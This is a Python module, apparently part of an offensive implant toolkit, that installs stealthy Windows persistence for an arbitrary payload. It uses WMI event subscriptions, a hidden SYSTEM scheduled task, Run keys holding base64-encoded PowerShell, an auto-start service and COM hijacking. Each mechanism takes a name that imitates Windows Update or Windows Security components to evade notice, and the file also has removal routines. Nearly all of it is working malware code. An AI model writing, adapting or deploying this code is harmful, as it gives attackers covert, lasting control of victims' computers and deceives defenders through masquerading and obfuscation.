#!/usr/bin/env python3
"""
Elite Persistence Command - Install multiple persistence mechanisms
Uses WMI events, registry, scheduled tasks, and services
"""

import os
import sys
import ctypes
import time
import tempfile
import subprocess
from ctypes import wintypes

def elite_persistence(method="all", payload_path=None):
    """
    Install advanced persistence mechanisms:
    - WMI Event Subscriptions (most stealthy)
    - Hidden Scheduled Tasks
    - Registry Run keys (obfuscated)
    - Windows Services (if admin)
    - COM hijacking
    """
    
    if not payload_path:
        # Use current executable as default
        payload_path = sys.executable
    
    if not os.path.exists(payload_path):
        return {
            "success": False,
            "error": f"Payload path not found: {payload_path}",
            "methods": []
        }
    
    try:
        installed_methods = []
        
        if method == "all" or method == "wmi":
            if _install_wmi_persistence(payload_path):
                installed_methods.append("WMI Event Subscription")
        
        if method == "all" or method == "task":
            if _install_scheduled_task(payload_path):
                installed_methods.append("Hidden Scheduled Task")
        
        if method == "all" or method == "registry":
            if _install_registry_persistence(payload_path):
                installed_methods.append("Registry Run Key")
        
        if method == "all" or method == "service":
            if _is_admin() and _install_service_persistence(payload_path):
                installed_methods.append("Windows Service")
        
        if method == "all" or method == "com":
            if _install_com_hijacking(payload_path):
                installed_methods.append("COM Hijacking")
        
        return {
            "success": len(installed_methods) > 0,
            "payload_path": payload_path,
            "methods_requested": method,
            "methods_installed": installed_methods,
            "install_count": len(installed_methods)
        }
    
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "payload_path": payload_path,
            "methods": []
        }

def _install_wmi_persistence(payload_path):
    """Install WMI event subscription persistence (most stealthy)"""
    try:
        if os.name != 'nt':
            return False
        
        import win32com.client
        
        # Connect to WMI
        wmi_service = win32com.client.Dispatch("WbemScripting.SWbemLocator")
        wmi_connection = wmi_service.ConnectServer(".", "root\\subscription")
        
        # Create Event Filter
        event_filter = wmi_connection.Get("__EventFilter").SpawnInstance_()
        event_filter.Name = "WindowsUpdateMonitor"
        event_filter.QueryLanguage = "WQL"
        event_filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
        event_filter.Put_()
        
        # Create Command Line Consumer
        consumer = wmi_connection.Get("CommandLineEventConsumer").SpawnInstance_()
        consumer.Name = "WindowsUpdateHandler"
        consumer.CommandLineTemplate = f'powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "{payload_path}"'
        consumer.Put_()
        
        # Bind Filter to Consumer
        binding = wmi_connection.Get("__FilterToConsumerBinding").SpawnInstance_()
        binding.Filter = f"__EventFilter.Name='WindowsUpdateMonitor'"
        binding.Consumer = f"CommandLineEventConsumer.Name='WindowsUpdateHandler'"
        binding.Put_()
        
        return True
    
    except ImportError:
        # Fallback to PowerShell if pywin32 not available
        return _install_wmi_persistence_powershell(payload_path)
    except Exception as e:
        print(f"WMI persistence failed: {e}")
        return False

def _install_wmi_persistence_powershell(payload_path):
    """Install WMI persistence using PowerShell"""
    try:
        ps_script = f'''
        $FilterArgs = @{{
            Name = "WindowsUpdateMonitor"
            EventNamespace = "root\\cimv2"
            QueryLanguage = "WQL"
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
        }}
        $Filter = Set-WmiInstance -Namespace "root\\subscription" -Class "__EventFilter" -Arguments $FilterArgs
        
        $ConsumerArgs = @{{
            Name = "WindowsUpdateHandler"
            CommandLineTemplate = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File '{payload_path}'"
        }}
        $Consumer = Set-WmiInstance -Namespace "root\\subscription" -Class "CommandLineEventConsumer" -Arguments $ConsumerArgs
        
        $BindingArgs = @{{
            Filter = $Filter
            Consumer = $Consumer
        }}
        Set-WmiInstance -Namespace "root\\subscription" -Class "__FilterToConsumerBinding" -Arguments $BindingArgs
        '''
        
        result = subprocess.run(
            ['powershell', '-WindowStyle', 'Hidden', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_script],
            capture_output=True,
            text=True,
            timeout=30
        )
        
        return result.returncode == 0
    
    except Exception as e:
        print(f"PowerShell WMI persistence failed: {e}")
        return False

def _install_scheduled_task(payload_path):
    """Create hidden scheduled task"""
    try:
        if os.name != 'nt':
            return False
        
        # Create task XML
        task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
          <Settings>
            <Hidden>true</Hidden>
            <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
            <WakeToRun>false</WakeToRun>
            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
            <AllowHardTerminate>true</AllowHardTerminate>
            <StartWhenAvailable>true</StartWhenAvailable>
            <RunOnlyIfIdle>false</RunOnlyIfIdle>
          </Settings>
          <Triggers>
            <LogonTrigger>
              <Enabled>true</Enabled>
            </LogonTrigger>
            <BootTrigger>
              <Enabled>true</Enabled>
            </BootTrigger>
          </Triggers>
          <Principals>
            <Principal>
              <UserId>S-1-5-18</UserId>
              <RunLevel>HighestAvailable</RunLevel>
            </Principal>
          </Principals>
          <Actions>
            <Exec>
              <Command>powershell.exe</Command>
              <Arguments>-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "{payload_path}"</Arguments>
            </Exec>
          </Actions>
        </Task>'''
        
        # Save XML to temp file
        temp_xml = tempfile.mktemp(suffix='.xml')
        with open(temp_xml, 'w', encoding='utf-16') as f:
            f.write(task_xml)
        
        try:
            # Create task using schtasks
            result = subprocess.run(
                ['schtasks', '/create', '/tn', 'Microsoft\\Windows\\Shell\\UpdateOrchestrator', '/xml', temp_xml, '/f'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            success = result.returncode == 0
            
        finally:
            # Clean up temp file
            try:
                os.remove(temp_xml)
            except:
                pass
        
        return success
    
    except Exception as e:
        print(f"Scheduled task persistence failed: {e}")
        return False

def _install_registry_persistence(payload_path):
    """Install registry persistence with obfuscation"""
    try:
        if os.name != 'nt':
            return False
        
        import winreg
        
        # Multiple registry locations
        reg_locations = [
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
        ]
        
        success_count = 0
        
        for hive, path in reg_locations:
            try:
                key = winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE)
                
                # Use legitimate-sounding name
                value_name = "WindowsSecurityHealthService"
                
                # Obfuscate command with PowerShell encoding
                command = f'powershell.exe -WindowStyle Hidden -EncodedCommand {_encode_powershell_command(payload_path)}'
                
                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, command)
                winreg.CloseKey(key)
                
                success_count += 1
                
            except Exception as e:
                print(f"Registry persistence failed for {path}: {e}")
                continue
        
        return success_count > 0
    
    except Exception as e:
        print(f"Registry persistence failed: {e}")
        return False

def _install_service_persistence(payload_path):
    """Install Windows service persistence"""
    try:
        if os.name != 'nt' or not _is_admin():
            return False
        
        # Create service using sc command
        service_name = "WindowsSecurityHealthService"
        display_name = "Windows Security Health Service"
        
        # Create service
        result = subprocess.run([
            'sc', 'create', service_name,
            'binPath=', f'powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "{payload_path}"',
            'DisplayName=', display_name,
            'start=', 'auto'
        ], capture_output=True, text=True, timeout=30)
        
        if result.returncode == 0:
            # Start service
            subprocess.run(['sc', 'start', service_name], 
                         capture_output=True, timeout=10)
            return True
    
    except Exception as e:
        print(f"Service persistence failed: {e}")
    
    return False

def _install_com_hijacking(payload_path):
    """Install COM hijacking persistence"""
    try:
        if os.name != 'nt':
            return False
        
        import winreg
        
        # COM objects that are frequently accessed
        com_objects = [
            "{BCDE0395-E52F-467C-8E3D-C4579291692E}",  # MMDeviceEnumerator
            "{00000000-0000-0000-C000-000000000046}",  # IUnknown
        ]
        
        for clsid in com_objects:
            try:
                # Create registry key for COM hijack
                key_path = f"SOFTWARE\\Classes\\CLSID\\{clsid}\\InprocServer32"
                
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
                
                # Point to our payload
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload_path)
                winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
                
                winreg.CloseKey(key)
                
                return True  # Success with first COM object
                
            except Exception as e:
                print(f"COM hijacking failed for {clsid}: {e}")
                continue
    
    except Exception as e:
        print(f"COM hijacking failed: {e}")
    
    return False

def _encode_powershell_command(payload_path):
    """Encode PowerShell command to avoid detection"""
    import base64
    
    # Create PowerShell command
    ps_command = f'Start-Process -FilePath "{payload_path}" -WindowStyle Hidden'
    
    # Encode as UTF-16LE and then base64
    utf16_bytes = ps_command.encode('utf-16le')
    encoded = base64.b64encode(utf16_bytes).decode('ascii')
    
    return encoded

def _is_admin():
    """Check if running with administrator privileges"""
    if os.name == 'nt':
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:
        return os.geteuid() == 0

def elite_unpersistence():
    """Remove installed persistence mechanisms"""
    try:
        removed_methods = []
        
        # Remove WMI persistence
        if _remove_wmi_persistence():
            removed_methods.append("WMI Event Subscription")
        
        # Remove scheduled task
        if _remove_scheduled_task():
            removed_methods.append("Scheduled Task")
        
        # Remove registry persistence
        if _remove_registry_persistence():
            removed_methods.append("Registry Keys")
        
        # Remove service
        if _remove_service_persistence():
            removed_methods.append("Windows Service")
        
        # Remove COM hijacking
        if _remove_com_hijacking():
            removed_methods.append("COM Hijacking")
        
        return {
            "success": len(removed_methods) > 0,
            "methods_removed": removed_methods,
            "removal_count": len(removed_methods)
        }
    
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "methods_removed": []
        }

def _remove_wmi_persistence():
    """Remove WMI event subscription"""
    try:
        if os.name != 'nt':
            return False
        
        import win32com.client
        
        wmi_service = win32com.client.Dispatch("WbemScripting.SWbemLocator")
        wmi_connection = wmi_service.ConnectServer(".", "root\\subscription")
        
        # Remove filter
        try:
            filters = wmi_connection.ExecQuery("SELECT * FROM __EventFilter WHERE Name='WindowsUpdateMonitor'")
            for filter_obj in filters:
                filter_obj.Delete_()
        except:
            pass
        
        # Remove consumer
        try:
            consumers = wmi_connection.ExecQuery("SELECT * FROM CommandLineEventConsumer WHERE Name='WindowsUpdateHandler'")
            for consumer in consumers:
                consumer.Delete_()
        except:
            pass
        
        # Remove bindings
        try:
            bindings = wmi_connection.ExecQuery("SELECT * FROM __FilterToConsumerBinding")
            for binding in bindings:
                if "WindowsUpdateMonitor" in str(binding.Filter) or "WindowsUpdateHandler" in str(binding.Consumer):
                    binding.Delete_()
        except:
            pass
        
        return True
    
    except Exception as e:
        print(f"WMI persistence removal failed: {e}")
        return False

def _remove_scheduled_task():
    """Remove scheduled task"""
    try:
        if os.name != 'nt':
            return False
        
        result = subprocess.run(
            ['schtasks', '/delete', '/tn', 'Microsoft\\Windows\\Shell\\UpdateOrchestrator', '/f'],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        return result.returncode == 0
    
    except Exception as e:
        print(f"Task removal failed: {e}")
        return False

def _remove_registry_persistence():
    """Remove registry persistence"""
    try:
        if os.name != 'nt':
            return False
        
        import winreg
        
        reg_locations = [
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
        ]
        
        success_count = 0
        
        for hive, path in reg_locations:
            try:
                key = winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE)
                
                try:
                    winreg.DeleteValue(key, "WindowsSecurityHealthService")
                    success_count += 1
                except FileNotFoundError:
                    pass  # Value doesn't exist
                
                winreg.CloseKey(key)
                
            except Exception as e:
                print(f"Registry removal failed for {path}: {e}")
                continue
        
        return success_count > 0
    
    except Exception as e:
        print(f"Registry persistence removal failed: {e}")
        return False

def _remove_service_persistence():
    """Remove Windows service"""
    try:
        if os.name != 'nt':
            return False
        
        service_name = "WindowsSecurityHealthService"
        
        # Stop service first
        subprocess.run(['sc', 'stop', service_name], 
                      capture_output=True, timeout=10)
        
        # Delete service
        result = subprocess.run(['sc', 'delete', service_name],
                               capture_output=True, text=True, timeout=10)
        
        return result.returncode == 0
    
    except Exception as e:
        print(f"Service removal failed: {e}")
        return False

def _remove_com_hijacking():
    """Remove COM hijacking"""
    try:
        if os.name != 'nt':
            return False
        
        import winreg
        
        com_objects = [
            "{BCDE0395-E52F-467C-8E3D-C4579291692E}",
            "{00000000-0000-0000-C000-000000000046}",
        ]
        
        success_count = 0
        
        for clsid in com_objects:
            try:
                key_path = f"SOFTWARE\\Classes\\CLSID\\{clsid}\\InprocServer32"
                
                # Delete the key we created
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                success_count += 1
                
            except FileNotFoundError:
                pass  # Key doesn't exist
            except Exception as e:
                print(f"COM removal failed for {clsid}: {e}")
                continue
        
        return success_count > 0
    
    except Exception as e:
        print(f"COM hijacking removal failed: {e}")
        return False

if __name__ == "__main__":
    # Test the elite persistence command
    print("Testing Elite Persistence Command...")
    
    # Create a test payload file
    test_payload = "test_payload.py"
    with open(test_payload, 'w') as f:
        f.write('#!/usr/bin/env python3\nprint("Test payload executed")\n')
    
    try:
        # Test installing persistence
        print(f"\n1. Installing persistence with payload: {test_payload}")
        result = elite_persistence("all", test_payload)
        
        if result["success"]:
            print(f"✓ Persistence installation successful!")
            print(f"  Methods installed: {result['install_count']}")
            for method in result['methods_installed']:
                print(f"    - {method}")
        else:
            print(f"✗ Persistence installation failed: {result['error']}")
        
        # Test removing persistence
        print(f"\n2. Removing persistence...")
        result = elite_unpersistence()
        
        if result["success"]:
            print(f"✓ Persistence removal successful!")
            print(f"  Methods removed: {result['removal_count']}")
            for method in result['methods_removed']:
                print(f"    - {method}")
        else:
            print(f"✗ Persistence removal failed: {result['error']}")
    
    finally:
        # Clean up test file
        try:
            os.remove(test_payload)
        except:
            pass